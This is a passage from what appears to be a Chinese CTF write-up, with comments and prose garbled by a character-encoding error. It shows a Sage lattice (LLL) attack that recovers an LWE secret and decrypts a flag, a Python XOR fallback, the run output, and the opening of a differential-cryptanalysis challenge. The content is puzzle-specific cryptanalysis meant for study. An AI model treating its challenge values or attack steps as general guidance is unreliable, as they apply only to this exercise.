15217742851031649669, 1537059029322832611, 8446687129174920496, 2285886128170803473, 10396457295791590736, 8184521285256628237, 12281586985752652674, 9145977157683807581, 4401966088668598902, 1347966527321824865, 4971876202222104297, 13050076615647289019, 15238126733935037378, 13630298739129514792, 5597091278359468382, 12160671849934738502, 7353364679428914848, 8706206420607129034, 7444341011997324184, 7893402865848621039, 9332663501518284957, 7565446801947506980], [11270590395251495492, 11112292971339156235, 12248552091431435645, 10950974548233567628, 13357868635958474324, 10191542276937410141, 8522698732818226777, 11458897264688365712, 9947847451532410217, 14749854369871029307, 2595734263687805071, 7462103527994903591, 9225852197178820940, 11035810387124205151, 9277482953179583298, 15035307154884199422, 12815975699046797425, 5179224106624138046, 8293810724759699051, 2882104565119096294, 1158272446939611195, 6192793627312305315, 3571881013067288917, 4759090560322877009, 5116626800600914281, 8935794681495430558, 12933142131125369032, 13240496568584928514, 14425884601080121199, 10510791035323289935, 12762828247231970983, 12878981969471590381, 12511445526606693142, 3727250841867410424, 3723951135224690044, 13938013904899791632, 1817115752732156574, 12478351294229262571, 11047310578821199033, 61746998238140156, 10138724331324191417, 12721676486257910645, 3273676096251595124, 12688477325883850773, 5137728431622377486, 9217805339179165652, 2373624115238642703, 918157650926816873], [3195063346397469206, 12902886030141702987, 3038184758782899003, 10675872975893646981, 10390555151791660417, 2713440147755053464, 3147803831185541181, 5134111254667859764, 12540578080736017052, 3094922551881862960, 4953716472427033763, 288274718400225905, 7022739725554240478, 2559962173429706821, 12616462573886863408, 1522630418540452634, 1941497282276385894, 8512683823275292202, 11643351993522349484, 11253713014504601602, 4964904685850389745, 5899368725461814813, 11860645568368886885, 1083748543772223284, 14264939049019076721, 3362447408513083967, 12171930668263005901, 394663284653550727, 5847890230360050534, 7919314681076544743, 1303069131509079360, 7804870887463721069, 4171691814752314769, 386637243641378471, 2316265073630801814, 14309823550558626277, 12522485696944728393, 1003602009508894744, 10157808066440226910, 11846424221349443008, 15278595565100725098, 5257505880425539568, 5010230819598272463, 8775955698331535237, 6275126636868430021, 8005563061218853819, 15153796165302298350, 9924798978236884054], [11362516023668531411, 6904985136497353573, 2758353174397121271, 9438860249196746823, 11907508628644058689, 3463749417068477686, 159939435648902123, 12029995879143687946, 4896356485488408413, 13486086420843516475, 15115346925302980159, 15255314162187312289, 11084974846089706326, 12954775519068719325, 7080537373228792456, 14992703455895955572, 2061415958201704128, 12946359608192242138, 8902784587907840853, 1587564917241026526, 6835448942496664526, 8182553642756053625, 6448882397523223103, 11541612455144957612, 7650321286053280758, 14820306223388966433, 5112113122923044174, 6892590356297327099, 15212624076149313279, 6166549905037922347, 8507802707178908834, 1404813218310593562, 10292631768643261864, 15408906931178265210, 2908939069841231902, 9858447521639794040, 10156781990061311531, 2468782904320057050, 3592238379290908114, 11093171642110044447, 10617213376077795451, 2992296750867250973, 15299685264008358367, 9004907100788255912, 10316116223262566384, 14704550688508166696, 13865102839838068605, 2869318070230226972], [4963841354867729946, 12196897592303465253, 13581026476211171575, 12763549296743612527, 1969741323174714729, 13627574075137812637, 14510301879453635354, 8586718739101138486, 14891109655963044468, 13578937420475076591, 13594926272062716313, 5889709042631503049, 1558975699574459017, 3157476176602417476, 1210577147521783282, 11288439053770753604, 10658711241328163052, 7367984433338228566, 6361041210574096727, 4022407193382950570, 872443466427313623, 12254724140660573334, 3594632867969965302, 617149073538721588, 3174751705885157038, 1532215258420256755, 12445718214950312521, 13620458361531291407, 11357274358494336373, 5087816915522315826, 7864359746649789875, 2813834139158218577, 13052454191008016112, 11817716234131208324, 2287806906673962058, 6641583103096374316, 9130564754959558047, 2000355748753604743, 13512985129349872569, 14641656667071069052, 6381250958388707199, 4566844565886120315, 7810185744106048781, 739018749901229838, 3049953442518311296, 269791130117216451, 12837013311285208951, 11853835746084758766], [11110451366389431862, 6605546398626501299, 13086994073205320851, 1473567187296710720, 9221017831881045543, 3576495188762836910, 9171903971349861010, 4894499039075169316, 9432847590783472653, 10706501089861234724, 7060380958533101192, 1157124115690958748, 13486433553927320402, 9591571919956392747, 7939288459921826455, 5105121228957343099, 11019353817004154384, 13020430454791833946, 3851352148411565614, 5927609172790402100, 14285145631443536584, 15163589597738899776, 2079223995059162022, 9053483487828264120, 6378738160618265013, 1318539326031817900, 3472213188706809134, 1146941381652192247, 10465318435592543359, 9713698050051730078, 422829580632419736, 11891906832623226684, 10894701178604747048, 11213882558155867515, 7220809347937526316, 13423633621452400987, 1193341369818146389, 13926040401857791216, 3887118523331107516, 13431876786557925987, 2323699852290300166, 7272780749959631460, 4228054660697537573, 11987237723616052241, 6775716243315507043, 5922311954266558280, 6448047517800926653, 3212113082948244064], [14845478688121147145, 5180384916335023066, 9284617234706062106, 3435224314536267923, 6148735811943083327, 13084367789934998641, 11563497387592120641, 11522647503729022140, 14304117620469495120, 7284745062383936819, 10481245532801146694, 8002830942665241346, 3273376122189513506, 9082446013172933914, 6092686134818253409, 5630933079946119599, 1722935826073634865, 3907755293582707020, 4997216167595480897, 6742574206804351737, 2135716866891973662, 3171738758602010248, 8580828010041320452, 1690326386704585565, 12256636432313005208, 1195815951597310039, 10416977884408848760, 10634961383176501925, 821350178811190433, 5962620586247201171, 2850229187152861059, 9849612107762904805, 3143257981144961685, 4813644165007573378, 13134471151039401766, 6651479850465257873, 13825443340640830194, 15443694950434234823, 13952583808143450719, 11155961104047965164, 9709675961987905735, 7547243434116798976, 7862496737011152629, 9313285055368916743, 14167008158696051047, 1864181368168429578, 4506396068017406101, 3412278109848817692], [530483184801901145, 479569182808570381, 6569729174307976944, 4421371412904464408, 10026028585843555502, 4032307259535889026, 12815291562361345545, 11767706916497563653, 13266668557965108232, 11053750457214310711, 842948726451841289, 13348600500087300395, 8151927472324610793, 11432360658921823560, 9581955823260767153, 3690483965596701098, 14329735935896018159, 8122201576615898980, 10105247688705933162, 5599172677977943271, 11835349004439084802, 8248917648622002527, 4299026116324593083, 14321923868415957919, 3843307571721854801, 3174393513728366216, 12315402843817184892, 1577831031774571593, 13662407572567930456, 11008848092844354259, 5189704456336982794, 13340893653712167710, 1979438846883036095, 13511986945677209060, 8592177270620037003, 8227520227041823097, 13412923571100068124, 10608169415094374519, 14279964092035990531, 10160766953974440183, 11441239603074202347, 5684482090050179846, 4377029101588477503, 3750677438379931113, 9607851289127064160, 111117189283343302, 404085847700481577, 3424166778938974881], [3446325349588280952, 15050443093549903771, 3417950596292902498, 10914058001901085153, 2083815143892535697, 892965617737042171, 13659331637595650920, 3239825573939868011, 5747489803446174135, 9928390468351279367, 12309170274612294985, 4714905050259920934, 9119207161559513501, 14110965831228718559, 3575300029173526552, 2666768864088184678, 1411293513597940267, 14000251700893659077, 15180723841329191257, 5123572399299302913, 12920619455514750692, 7939645982711521831, 531209751278406468, 5779736196214152537, 8752068180376631623, 13552293781710280773, 6310023309365315533, 5388155699450478237, 10140859881878889527, 2392444884475795628, 2897859163393051266, 14514037181658708913, 10253477748805495833, 7847448028583451460, 9232232152036335816, 10097437137476315425, 15069924490084636325, 12249729887223029521, 10372510628335878027, 450401955914071133, 14345969382990261828, 15047765310999261070, 1918474287723274734, 9353321779705167713, 14041738460108053337, 6334181019960338767, 10987570167746133440, 3372224607771223063], [5500936177814767943, 3409495070188226748, 6744494232789358066, 3792299476694895057, 7904933552811592390, 6518463706750098087, 10698584865695337241, 15291959958017676303, 3567004487913538118, 2864798609249904547, 11955340778688346600, 8316727261020988757, 4844021942933407061, 13143292114770708807, 15048657996186002649, 10570201312346125165, 8371577922782752541, 14088007905104046343, 7087331662516000278, 11301789519453262232, 14335306581030624340, 12508876199162405514, 14931954971703969559, 3939431574352962172, 2254844076162206486, 4059003330303332799, 10845088951499702062, 9020032426028254283, 6608576249800471099, 5995565952802585093, 5415874107068903361, 2384609743747122104, 14851026337398548963, 8816347338318110188, 9962870957922526292, 4969682666695550393, 15243130434530500746, 2058714360732719211, 8406771325561282936, 10743633086733183329, 10100395395263654480, 12474847245839862134, 10336216982854269101, 10963212562443299483, 14195976528384163384, 13331873078725026046, 1158767702429398367, 9928676503475880550], [14742712984974690207, 5899019786327147939, 9175192728011424023, 11149314554827585473, 4024896589311690476, 3719094365014495831, 12048836764635244345, 15246260382109473942, 8275217875226290059, 1808871241372465037, 5187266271383230733, 5077460000826388118, 5688528615102020221, 11648718931501462558, 15334165728114136493, 784852172593357022, 11700003853499407015, 1502710775467739662, 68591774814833547, 10583310589694330523, 14139471072831659451, 7133877076388003795, 3712227205262586921, 2406204753262220078, 11588403598173580508, 6628786793992125747, 14034783388753614413, 10717198513643174245, 7717692140031234012, 10644186766457443894, 5097672489917624790, 8705138441935070590, 7369447665235284766, 1899557162689975646, 8960878729709225104, 7651641691216155482, 4110783088806265504, 12733829958984848712, 7739679326303443504, 7446020089808502097, 14632160912217662761, 10989086315188865980, 2998256824760407786, 11955895297593702383, 11740800544377345113, 7157955491977867558, 4937924943031548001, 8531722010667052775], [1585671701779943334, 11313901802663948111, 14832408914542538489, 14648166644793951748, 12116157540422370584, 12939036605157243438, 686886466200116155, 1984490240120895072, 3998530097584861620, 1808384569213526395, 3083807072006827555, 6627238996312228583, 6806592510571910099, 12948853685794877157, 12057428167941991447, 3698769412058316821, 3736605456988062057, 11695183343635813032, 11694868935630046405, 11192444478210481402, 878285685203394989, 14071965602358018885, 3316135306597525236, 1473089747587036092, 9952355013116206590, 8273009266773769232, 4357129825497261981, 2871424911050633765, 6128989387057959079, 10101800140955557701, 10019309927223635736, 14262805519518129845, 11742629791371447162, 3806274903528069920, 2016931458456548546, 845877396265108329, 119904574421809689, 3097429475833691929, 14263916888806569210, 7204710538170629195, 9396876562287022322, 10495141051502997715, 12255338712204396457, 9970834120421113495, 12278069294717170933, 1373045645549132720, 2123395974875300302, 9631341101056672371], [9390901767737569235, 11041427373182747298, 8134991344792941508, 1789639745370298057, 2092065002105313602, 7736256640444736988, 7568361355038860522, 11555271464508273904, 10412737448081400258, 5562001256182826159, 12932255550028739147, 8553751178754969094, 647031439276860913, 7674589066487645604, 10824845043291333433, 2805724503389804087, 882290822894411092, 12867944407623630611, 2183368911908550159, 3322644845370562012, 12079606836086350983, 6187845142156452727, 8359573279640218490, 7511342570689815354, 2001796363578641787, 1250524272267240346, 6995798168324451950, 9131923160028928409, 8531594196342761792, 13657139742325835789, 8980768320358958094, 6696457424304430293, 2698169685871649474, 14190529649813646677, 3314698994618897417, 5817809173096346660, 7425084035024690400, 11291856862895638150, 2452854556822060014, 6342856948053176608, 7327382796131187679, 13898711306933038197, 13616479361300874534, 10608231335526179444, 12536876820203379915, 12984142819750652103, 8852730216785272838, 1727357805811542112], [7725800161609631786, 8682154166050151968, 4448936450230874040, 1373527083226919318, 8242315814496497979, 683968547056171625, 846094567122854872, 13014074618167450816, 5559517513593399483, 196996692743630339, 6334670942063712398, 7128739273834737111, 12037617672615001684, 10983472449425836718, 10705230844788461219, 11268525028278972832, 5019773044784161119, 14142695969394404742, 2410044467661840921, 7887964868934699309, 12124561149870607009, 7003544354369409642, 760223164734687124, 2262996269398894638, 2077259523344289288, 1918901583156299470, 14086084587778836211, 10493205509018468282, 11847982978380833200, 12693894144904837409, 3287587879307522081, 6701194801416403928, 12998092649529282984, 15370812867583420055, 11662993881635697832, 1773667504841696145, 1204822687362447369, 1759718894846518964, 9498674387498824786, 4154518468622771341, 929943974046181334, 7497254352472634564, 15200109745585765065, 7040668566761929102, 10946554795735311591, 7419003285983751470, 531227576739005083, 10711563625739378597], [5444168041576498831, 9299711168237865600, 8095233903063936511, 8811222437750202173, 9658576371370074332, 8922602137214970711, 10481396546330759003, 9400672043224387528, 4394078792483208374, 12481945112017983956, 6669376780604085737, 11965862638402810918, 6117692673313886332, 15300647810916421898, 12711079581137443209, 14738920357969870148, 1355963191927824250, 6896345183107943994, 5677733158292139124, 4219552135355633273, 10245123872655109652, 7754513098076092437, 8106652004046918989, 6892355645646388970, 7075823968496867219, 13058041531991524533, 2126012944455425651, 9863027060841151911, 9164440836904820839, 402563435887647195, 4542254128286027225, 7670764969761439464, 9122095879566332643, 13467105383323952743, 12606967452314210684, 3883064322556063236, 13776821690293907923, 9963741853116353536, 10328653672275037123, 5733740963649310460, 5140235266510749306, 11161738948493163397, 399376223349148777, 5977194086701640886, 4127344151432247815, 12870914256643023983, 10171009260322011657, 12322017833779934930], [3030587101538643036, 2824821501104728311, 4713286950728050311, 12575765415830995609, 5148213252264543617, 4887789621994678724, 8865280873262236841, 6272152236595352214, 4530602128392552663, 8235076031905525746, 7804059820618568127, 8385740527148416238, 12238856281283985218, 15023442750045133979, 5645968904729619369, 6764753142711064066, 7196642629107637755, 6051122423699091400, 7308514748516034441, 7918155443670626435, 646631920207716512, 8928058617347475313, 7855567511817767347, 8952552001920860239, 4745224229220700223, 5032290164631637979, 13229696918424123747, 6955053191523671209, 6105573238410139525, 5321110858820179249, 15231824756920157022, 1260522930219929576, 5586053842235789214, 12471979103395731765, 8076086778554012878, 6825991275540935160, 1742827687074338609, 5277095337243589414, 11983049155156636655, 8105956595726242759, 575061644701120425, 13127018783682275950, 4797689621942041192, 5066843563941297511, 54420206165098043, 8872133045655295778, 15324845248466713306, 11449259329548061655], [8423001554964784758, 3182151773268733755, 1747094497927960458, 8793995709610900486, 676522570389564761, 13711412807153179493, 4344217499467849895, 12308876916253794411, 6904088091900661486, 6936911590560693841, 4815745090817831626, 4016561174567739333, 11931430639228846549, 12883765845174655215, 12117518564627295677, 10989844317758849491, 11442693510937494727, 13143422294998983182, 4822204037818672320, 11785514901342225900, 2549844011995911594, 3192873581736025889, 5398347958589902311, 14100795106342724157, 189894021917043350, 5095890598432878225, 13630515940949845682, 4981475645064095394, 9626390109232479453, 4141478018894599584, 11511563279960133899, 14964668060495517840, 13795621924714196369, 8044698557722546052, 10224411346075857618, 4007609642174814002, 9038906691805510974, 1304601469474371168, 15272501416547351870, 1375609048617114594, 14893052110629510117, 1879141957794774447, 11283386886642199212, 691036942052277536, 11977503286552200765, 10903633702681574436, 2073326741122265548, 1836091455667074252], [10613121761812729627, 12611078412497974852, 12013015913438999251, 12552767093538769791, 7189440701377588295, 8055900364548833064, 11868886088231186655, 15321476931306512247, 187072450055709044, 1605894775128529859, 6818247575465513614, 2529195102359776840, 6833952759279089827, 9677460142660679033, 6365993234332067309, 11255599742038031466, 8908859125043895158, 8583023230061751078, 5530790099390515449, 14206676156129046572, 13772865543740578484, 7399271681533106680, 3567609993580469709, 9498451333489810809, 13620767835646546850, 1694273891203360119, 603076618620496224, 14509758149615798676, 7250373908178887680, 2157021735235535428, 13510073573624148539, 9731081246817985532, 8069065163383943860, 1484146998622712540, 13193971303705996101, 12888257182944502709, 6251599783291885987, 4602064085737222460, 14271409281549210192, 11410590263416571459, 13327219298464552090, 7725504004408675085, 10039078961185794836, 6479557468818320648, 13720497552591707327, 9307622102587387618, 10102027020953593024, 5308817366378005165], [7125902336770604352, 5697978269295533817, 13743720918126487717, 7258714067715999043, 9090151727153523114, 9934145632351932117, 10242552107102669810, 1901271788778301864, 555548476069150774, 3030562872542736240, 1055098672513730997, 1276623741761628452, 7794374070662324289, 8729570220738503344, 836295610399409071, 12533277146148634337, 8760687091622353725, 3878647209841656183, 7153870748466909715, 12471542262781171056, 11177768055134874594, 4845865694084707852, 6032188619277246960, 7752337504366650778, 5008276201487868083, 955075409706060840, 6796631477183635673, 14338259375124854294, 455335643784743778, 2059354655059215592, 10388278093350738640, 5337123321595349436, 14926096025542653276, 398740441506553138, 8460939093618852164, 11743983330211497730, 7782591336702505194, 2916902635009229317, 1346953186607407924, 5001418060264189702, 11379594427517169905, 15055109324879777005, 5587057922272722369, 11452758441460608284, 7078461266012358732, 7592383260827570035, 1633624039517495000, 6920471999221333437], [905955177055489365, 6607438949961091608, 1019640851875533326, 15100027975058556296, 8797442903466993689, 9855713457561058143, 7059377081108494071, 11872179861083051481, 9648879932880155882, 13678591572808966577, 11595016968180568502, 9043754699356166276, 11719940474637776788, 12032282495747249443, 7720362332512164464, 5632201297526607689, 11252905483415024325, 13036160264309076630, 6430574230317773896, 12048936649601761063, 7275112563778107522, 2278489745362902024, 9813937741792014099, 751077433335703403, 2712147388887342792, 7460470627581379365, 4661336589616431375, 12715103573337580872, 1214860911973031522, 11811958566612350535, 2071062522202194245, 14118357884686022291, 14656620559934817010, 3352239181149035815, 5819559662321802290, 11686999327865800621, 8255950128296313200, 10351319809425131292, 8389298143583509258, 15008911439317265682, 870687332865224320, 6871845174909436672, 1183789927141526401, 10444065420096855643, 15196817639335120459, 1719415417872783770, 7105412253317222255, 10265609786665282093], [13813564132166308538, 497576990238991943, 12291969300104519036, 4448013362697381000, 9967625169059842466, 9313215608174368516, 6113242822446159050, 9105750808481351350, 7587116726023398052, 14930170554766877155, 7280442698332800880, 543575380090178737, 10190746827761865575, 7938391903830902176, 15320536299018127668, 5829596084310196746, 8028164454974216270, 7315231182804668190, 12053792435628462669, 9084447522581064475, 9799363065108674795, 1404962860080786334, 2505156164157917068, 9811788600760156188, 9993242034451648099, 6921327300795841793, 234930091909092387, 13589697260670712302, 8041302966447622055, 6546139216682516328, 13629997243093157040, 10549586470703898976, 1843602746521961813, 3065646151693544783, 831167611016404095, 5330890067856359604, 2558836700553609441, 2347039512919943174, 3151017987414334660, 11567305810485761331, 2477479709963567550, 327710906248947743, 4382961794467638975, 6374225005348467946, 2141787404772299654, 4935022300317875398, 13526846409484642407, 2789780425611284616], [8142619418423918400, 10336442919533542321, 6691497430147464575, 11423357232687344090, 8385806070810618085, 13426350039821067643, 7255145434897910047, 10984937294917032808, 7343994077086499319, 3312261350927289, 9526770296945940677, 4999820854038186581, 10163366081552337871, 5456665341266389869, 11263826500444637931, 78855405016276616, 10000424998204002257, 8793336968130041699, 569690364518553783, 14071999578024685164, 11424793257530385951, 7082866857889587111, 194887181038683080, 8937806524344528419, 3919698655441097008, 13750446957118983044, 7356795169896005009, 592455732452851841, 6271079568134056966, 10715524023045162300, 6516604925078660900, 4403515973867012320, 12528371168065480237, 5512509759393654300, 2494907423595589672, 5067692637340969722, 2539968082796112119, 14511108333804839407, 9872856970223646742, 13491591192593449309, 7482122114586331435, 5000524510518899753, 6106873636947706124, 1831477799878218111, 1462511372818430001, 1337617962503916072, 5485555667220987862, 10660713392694922498], [4418461706525058459, 12166824596488629350, 1656327408013253003, 7285484353519949269, 12025096099819423408, 9214610997070066868, 11738883510311891077, 6422976365094971819, 8891526026727635922, 4067160364818850597, 5350438513876797973, 5121031981956633432, 2343113451284047577, 6869207198954764756, 5632143681740982758, 4280278207576905493, 12430429655684651421, 14176484762776251024, 4800261282462021801, 10022288834818437354, 11344158334122521929, 497671226208603808, 6535905544064674143, 9440502869739005849, 1203962563051087065, 15351149115025546082, 10488209649462820851, 14190323883757911442, 9656713951166602820, 8926869681669643813, 7249825284710062629, 1713070209145635974, 5498557910648074812, 7054294550284021879, 13521063253188173862, 7721810610949806300, 9239851940511318787, 10617614883017175641, 12567255432664321280, 8174788321909652504, 704485948906720962, 6249904279206841739, 12730657774121389558, 13899210036507173971, 837765986860374339, 13784149492067213707, 10428637670430361039, 7890799085787042567], [8182875882676217165, 2159687652246121607, 5151057154271362650, 3686599864030263116, 9374165238889675743, 13648346640103714346, 13800410035365992025, 920425878072423857, 15246188851751781411, 14984462474838177703, 14151167256857270373, 2985562091628354761, 12791517755474693376, 8751294617932698399, 5007901292985036393, 9100779123904307157, 5930956274348696428, 49700380340248683, 2064149821012300697, 2111474061806909124, 1852520668637563568, 13198912099098408152, 1005570886907934992, 5701528968551320133, 1806696400293702402, 8345278388037337106, 9132135837557928232, 14277413795178754697, 13345949769063946415, 9447962958963709951, 1871807146467610161, 3539185772664468400, 9138113935915718596, 7315022561026767864, 9069015209496798263, 8503006344234959862, 5764270935577242415, 9908146319869688113, 5341488642781399207, 4231492059840784216, 11533951132854739850, 438042893981040364, 14130359711977900842, 3115775441308890535, 414184529022304479, 14128343700708997608, 6321113527567023936, 5083604492314065187], [5273746681216868997, 6966946105667266400, 7666162616583083355, 2051209943357519869, 7496435271495651241, 1137960814125851099, 4909281859657442735, 14752276199952463421, 7956153755531469246, 13893771336776563600, 9719928959452987477, 5212480266424952885, 13741812877120477650, 14891302806676237531, 7574365721532010284, 3980764664883822318, 10442857348307945378, 16897785141694518, 205575477890830834, 6436897975033764663, 11826062797076809841, 7633723667949386075, 10982234040550051197, 323944592814277864, 3214058368168760110, 5610134304570183614, 10499410540571396355, 1605745155041010972, 9174583064097619489, 8709027076491209066, 8883141886259764854, 2316561306724180304, 9209752788771310369, 2267695916869402, 6307829543362156582, 10539426920772256654, 8462179348428403477, 6697939448020711623, 12727231693376378927, 2626713554306355695, 7568703763704218237, 12872746920952544764, 7222276683425009891, 12900575334725548943, 1096137862335109625, 14532169371519763897, 659015517194037044, 9506517023480467315], [240187678184804451, 11707850450418813328, 11763682200396059368, 6949494692873845381, 14572367528772221576, 7872561112624972588, 6201631767851856414, 1751144528251369655, 11671354947878497551, 3064423305226199248, 6704951203453074764, 4612570305987419221, 572037497013747166, 5744949450913054523, 5000647536636399787, 10287883324662731540, 13014029253374022087, 14131834374244697117, 8839881920358708593, 6176633695537938742, 8719346028086473817, 7242791868188862719, 9800054957191133683, 8158059816350576905, 11960431985457769180, 6112653249886447326, 9432159322950778456, 7780431861115785085, 11781074379389999313, 11870395842316482122, 90814834776164246, 2602779048888761332, 6791623662044894594, 5609334576611174718, 12162469400013566700, 5910265902901852140, 4127739819468453727, 2689092577015135573, 11496091361551471192, 15207735403183545184, 3344513892086357448, 10753537328760360210, 9300537172975222620, 7553806476868948964, 3565231037230599775, 12999485797949824352, 8247848252753859759, 13327384661181031987]]

# b æˆ‘å·²ç»å¸®ä½ å¡«å¥½äº†
b = [13634387507598538757, 8235500991568786819, 8071460674679805714, 13684547151091728000, 4833870497024639625, 4656618149460859511, 14989868414544909122, 633345778077592334, 13988501212884101012, 12504487369705337804, 11625678981186718194, 12091909451510536585, 11512214136834797169, 12846416653055686634, 15139198342718832239, 1894951711345644217, 5701518354572289679, 4908978696811020505, 8746036715268832029, 9759286885418540365, 1787666852073719593, 532836792038082059, 7802177206526835509, 14790547858519593404, 10523966502824973303, 11772857502629641126, 3817508073724867822, 870772220742553542, 7334438549288672769, 11755737265413401775, 10996897310267095635, 10136267900083778727, 15023539271635307621, 945773947762258824, 3452489800732555486, 13578098160189110140, 14717016117516858011, 10426483627648857130, 1960322086568693783, 11607141053742799302, 9424783803143555586, 7445923786046095884, 5397863666652752336, 2389315921240204342, 10023969416846674401, 7214429600104700484, 7476930306745997223, 8863517013652757757, 4768653377405587840, 14172876211019023234, 4203274125247592028, 10586193369571002822, 12633785525543794729, 1703958399693866253, 8835843651687224358, 508158197954869765, 3095250658115211785, 7066360164395758926, 12776275059344639766, 12180913137305592041]

# ã€é‡è¦ã€‘è¯·å°† out.txt ä¸­å®Œæ•´çš„ A=[[...]] ç²˜è´´æ›¿æ¢ä¸‹é¢è¿™ä¸€è¡Œ
# åŠ¡å¿…ä¿è¯æ ¼å¼æ˜¯ Python/Sage çš„åˆ—è¡¨æ ¼å¼
# A = [[...], ..., [...]]
# â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“â†“

# â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘

# ==========================================
# æ±‚è§£é€»è¾‘ (SOLVER)
# ==========================================

def solve():
    if not A:
        print("[!] é”™è¯¯ï¼šä½ è¿˜æ²¡æœ‰ç²˜è´´çŸ©é˜µ A çš„æ•°æ®ï¼")
        return

    print("[-] Start Solving...")
    n = 48
    m = 60
    
    # 1. è¯¯å·®ä¸­å¿ƒåŒ–
    # é¢˜ç›®ä¸­ error åœ¨ [5900, 6000] ä¹‹é—´ï¼Œå–ä¸­å¿ƒ 5950
    center = 5950
    b_prime = [(bi - center) % p for bi in b]

    # 2. æ„é€ æ ¼çŸ©é˜µ
    # æ„é€  Kann Embedding æ ¼å­æ¥å¯»æ‰¾çŸ­å‘é‡ï¼ˆè¯¯å·® eï¼‰
    # Lattice basis L:
    # [ p * I_m   | 0 ]
    # [ A^T       | 0 ]
    # [ b_prime   | 1 ]
    
    print("[-] Constructing Lattice...")
    L = Matrix(ZZ, m + n + 1, m + 1)
    
    # å¡«å…… p * I_m
    for i in range(m):
        L[i, i] = p
        
    # å¡«å…… A^T
    # æ³¨æ„ï¼šæˆ‘ä»¬éœ€è¦ A çš„è½¬ç½®æ”¾å…¥æ ¼åŸºçš„ä¸­é—´éƒ¨åˆ†
    for i in range(n):
        for j in range(m):
            L[m + i, j] = A[j][i]
            
    # å¡«å…… b_prime å’Œ 1
    for j in range(m):
        L[m + n, j] = b_prime[j]
    L[m + n, m] = 1
    
    # 3. LLL è§„çº¦
    print("[-] Running LLL...")
    reduced_L = L.LLL()
    
    e_prime = None
    
    # 4. å¯»æ‰¾åŒ…å«è¯¯å·®çš„ç›®æ ‡å‘é‡
    # æˆ‘ä»¬å¯»æ‰¾æœ€åä¸€ç»´æ˜¯ 1 æˆ– -1 çš„å‘é‡
    for row in reduced_L:
        if row[m] == 1:
            e_prime = list(row[:m])
            break
        elif row[m] == -1:
            e_prime = [-x for x in row[:m]]
            break
            
    if e_prime is None:
        print("[!] Failed to recover error vector.")
        return

    print("[-] Error vector found!")
    
    # 5. æ¢å¤åŸå§‹è¯¯å·® e
    e_vec = [(x + center) for x in e_prime]
    
    # 6. æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„ A * s = b - e (mod p)
    print("[-] Solving linear system for s...")
    
    vec_b = vector(GF(p), b)
    vec_e = vector(GF(p), e_vec)
    target = vec_b - vec_e
    
    Mat_A = Matrix(GF(p), A)
    
    try:
        # ä½¿ç”¨ solve_right æ±‚è§£
        s = Mat_A.solve_right(target)
        print("[-] Secret s recovered!")
    except ValueError:
        print("[!] Linear system has no solution. Error vector likely incorrect.")
        return

    # 7. è®¡ç®— Key
    # Key æ˜¯ s å‰ 10 ä½å…ƒç´ çš„ä¹˜ç§¯
    Key = 1
    S_list = [int(x) for x in s]
    for i in range(10):
        Key *= S_list[i]
        
    print(f"[-] Calculated Key: {Key}")

    # 8. è§£å¯† Flag
    # ã€å…³é”®ä¿®å¤ã€‘å¼ºåˆ¶ä½¿ç”¨ int() è¿›è¡Œ Python å¼‚æˆ–ï¼Œé¿å… SageMath çš„æŒ‡æ•°è¿ç®—é”™è¯¯
    M = int(CC) ^ int(Key)
    
    try:
        flag = long_to_bytes(M)
        print(f"\n[SUCCESS] FLAG: {flag.decode()}")
    except Exception as e:
        print(f"\n[!] Decrypted M (Hex): {hex(M)}")
        print(f"[!] Decode error: {e}")

# è¿è¡Œè„šæœ¬
if __name__ == '__main__':
    solve()
```

```
(latt) âœ  ~ sage solve.sage
[-] Start Solving...
[-] Constructing Lattice...
[-] Running LLL...
[-] Error vector found!
[-] Solving linear system for s...
[-] Secret s recovered!
[-] Calculated Key: 34117838417393645245232889782433844371448224358809402851502421089076409793095351957088607164363696759684044605759266335983332325282015552087649188515295045669050493762002320038131075600000
```

ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¡ä½äº†ï¼Œåé¢ä¸¢ç»™aiç›´æ¥å¼„ä¸ªpythonè§£äº†

```
from Crypto.Util.number import long_to_bytes

# 1. é¢˜ç›®ç»™çš„å¯†æ–‡ CC
CC = 34117838417393645245232889782433844371448224358809402851502421141070689861491276117211335848678483269007265404950503463080005497089800226646525359172074859315940783930656864406105964118013

# 2. åˆšæ‰ Sage è„šæœ¬è·‘å‡ºæ¥çš„ Key (ä»ä½ çš„æ—¥å¿—é‡Œå¤åˆ¶çš„)
Key = 34117838417393645245232889782433844371448224358809402851502421089076409793095351957088607164363696759684044605759266335983332325282015552087649188515295045669050493762002320038131075600000

# 3. å¼‚æˆ–è§£å¯†
M = CC ^ Key

# 4. è½¬ä¸ºå­—ç¬¦
try:
    flag = long_to_bytes(M)
    print(f"Flag content: {flag}")
    print(f"Flag decoded: {flag.decode()}")
except Exception as e:
    print(f"M (int): {M}")
    print(f"Error: {e}")
```

```
D:\python-run\.venv\Scripts\python.exe D:\ä¸‹è½½\lwe1.py 
Flag content: b'SYC{fuck_It_to0_n0s1y_I_wanna_to_slee_121p1p_s1hit1}'
Flag decoded: SYC{fuck_It_to0_n0s1y_I_wanna_to_slee_121p1p_s1hit1}
```

# SBOX-revenge

ä¸€æ ·ç›´æ¥ä¸¢ai

````
è¿™æ˜¯ä¸€é“åŸºäºå·®åˆ†å¯†ç åˆ†æï¼ˆDifferential Cryptanalysisï¼‰çš„é¢˜ç›®ã€‚

### é¢˜ç›®åˆ†æ

1.  **åŠ å¯†æµç¨‹**ï¼š

      * æœåŠ¡å™¨é¦–å…ˆç”Ÿæˆä¸¤ä¸ªéšæœºå¯†é’¥ `key1` å’Œ `key2`ï¼Œä»¥åŠä¸€ä¸ª `IV`ã€‚
      * ä½¿ç”¨ `key1` å’Œ `IV` å¯¹ `flag` è¿›è¡Œæ ‡å‡†çš„ **AES-CBC** åŠ å¯†ï¼Œå¹¶å°†å¯†æ–‡ (`Cipher`) å’Œ `IV` å‘é€ç»™ä½ ã€‚
